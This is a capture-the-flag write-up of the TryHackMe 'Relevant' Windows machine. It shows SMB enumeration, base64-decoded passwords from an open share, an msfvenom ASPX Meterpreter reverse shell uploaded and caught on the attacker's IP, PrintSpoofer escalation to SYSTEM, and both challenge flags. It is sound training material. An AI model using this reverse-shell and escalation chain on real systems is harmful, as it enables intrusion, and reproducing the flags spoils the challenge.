# Relevant

Penetration Testing Challenge

[Relevant](https://tryhackme.com/room/relevant)

## Topic's

- Network Enumeration
- SMB Enumeration
- Cryptography
  - Base64
- Security Misconfiguration
- msfvenom (Aspx)
- Abusing Impersonation Privileges (PrintSpoofer)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Pre-Engagement Briefing

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.

**Scope of Work**

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt

Additionally, the client has provided the following scope allowances:

- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.

**Please do not stream this room for the first 7 days of it's release (August 21, 2020).**

```
kali@kali:~/CTFs/tryhackme/Relevant$ sudo nmap -p- -sS -sC -sV -O 10.10.9.11
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 21:31 CEST
Nmap scan report for 10.10.9.11
Host is up (0.063s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2020-10-14T19:34:20+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2020-07-24T23:16:08
|_Not valid after:  2021-01-23T23:16:08
|_ssl-date: 2020-10-14T19:35:00+00:00; 0s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-10-14T12:34:20-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-14T19:34:24
|_  start_date: 2020-10-14T19:29:46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.45 seconds
```

```
kali@kali:~/CTFs/tryhackme/Relevant$ smbclient -L //10.10.9.11
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
SMB1 disabled -- no workgroup available
kali@kali:~/CTFs/tryhackme/Relevant$ smbclient //10.10.9.11/nt4wrksv
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 23:46:04 2020
  ..                                  D        0  Sat Jul 25 23:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

                7735807 blocks of size 4096. 4950835 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> exit
kali@kali:~/CTFs/tryhackme/Relevant$ cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

kali@kali:~/CTFs/tryhackme/Relevant$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123

kali@kali:~/CTFs/tryhackme/Relevant$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

`Bob:!P@$$W0rD!123`

`Bill:Juw4nnaM4n420696969!$$$`

```
kali@kali:~/CTFs/tryhackme/Relevant$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.106.222 lport=4444 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201283 bytes
Final size of aspx file: 1015556 bytes
Saved as: shell.aspx
kali@kali:~/CTFs/tryhackme/Relevant$ smbclient //msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx^C
kali@kali:~/CTFs/tryhackme/Relevant$ smbclient //10.10.9.11/nt4wrksv
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (798.5 kb/s) (average 798.5 kb/s)
smb: \> ls
  .                                   D        0  Wed Oct 14 21:42:49 2020
  ..                                  D        0  Wed Oct 14 21:42:49 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020
  shell.aspx                          A  1015556  Wed Oct 14 21:42:50 2020

                7735807 blocks of size 4096. 4935058 blocks available
smb: \>
```

```
kali@kali:~/CTFs/tryhackme/Relevant$ msfconsole -q
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.8.106.222
lhost => 10.8.106.222
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.106.222:4444
[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.9.11:49873) at 2020-10-14 21:52:05 +0200
```

```
meterpreter > getuid
Server username: IIS APPPOOL\DefaultAppPool
meterpreter > cd c:/users
meterpreter > dir
Listing: c:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2020-07-25 17:05:52 +0200  .NET v4.5
40777/rwxrwxrwx   0     dir   2020-07-25 17:05:49 +0200  .NET v4.5 Classic
40777/rwxrwxrwx   0     dir   2020-07-25 16:57:31 +0200  Administrator
40777/rwxrwxrwx   0     dir   2016-07-16 15:34:35 +0200  All Users
40777/rwxrwxrwx   0     dir   2020-07-25 17:21:26 +0200  Bob
40555/r-xr-xr-x   0     dir   2016-07-16 08:04:24 +0200  Default
40777/rwxrwxrwx   0     dir   2016-07-16 15:34:35 +0200  Default User
40555/r-xr-xr-x   0     dir   2016-07-16 15:23:21 +0200  Public
100666/rw-rw-rw-  174   fil   2016-07-16 15:23:24 +0200  desktop.ini

meterpreter > cd c:/users/Bob/Desktop
meterpreter > dir
Listing: c:\users\Bob\Desktop
=============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  35    fil   2020-07-25 17:23:52 +0200  user.txt

meterpreter > cat user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

[PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

```
kali@kali:~/CTFs/tryhackme/Relevant$ smbclient //10.10.9.11/nt4wrksv
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> pwd
Current directory is \\10.10.9.11\nt4wrksv\
smb: \> ls
  .                                   D        0  Wed Oct 14 21:42:49 2020
  ..                                  D        0  Wed Oct 14 21:42:49 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020
  shell.aspx                          A  1015556  Wed Oct 14 21:42:50 2020

                7735807 blocks of size 4096. 5135045 blocks available
smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (22.4 kb/s) (average 22.4 kb/s)
smb: \> ls
  .                                   D        0  Wed Oct 14 22:08:03 2020
  ..                                  D        0  Wed Oct 14 22:08:03 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020
  PrintSpoofer.exe                    A    27136  Wed Oct 14 22:08:04 2020
  shell.aspx                          A  1015556  Wed Oct 14 21:42:50 2020

                7735807 blocks of size 4096. 5135038 blocks available
smb: \> exit
```

```
c:\users\Bob\Desktop>cd C:\
cd C:\

C:\>cd \inetpub\wwwroot\nt4wrksv
cd \inetpub\wwwroot\nt4wrksv

C:\inetpub\wwwroot\nt4wrksv>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\inetpub\wwwroot\nt4wrksv

10/14/2020  01:08 PM    <DIR>          .
10/14/2020  01:08 PM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
10/14/2020  01:08 PM            27,136 PrintSpoofer.exe
10/14/2020  12:42 PM         1,015,556 shell.aspx
               3 File(s)      1,042,790 bytes
               2 Dir(s)  21,033,115,648 bytes free

C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> cd \users\administrator\desktop
cd \users\administrator\desktop
PS C:\users\administrator\desktop> dir
dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/25/2020   8:25 AM             35 root.txt


PS C:\users\administrator\desktop> type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```

1. User Flag

`THM{fdk4ka34vk346ksxfr21tg789ktf45}`

2. Root Flag

`THM{1fk5kf469devly1gl320zafgl345pv}`
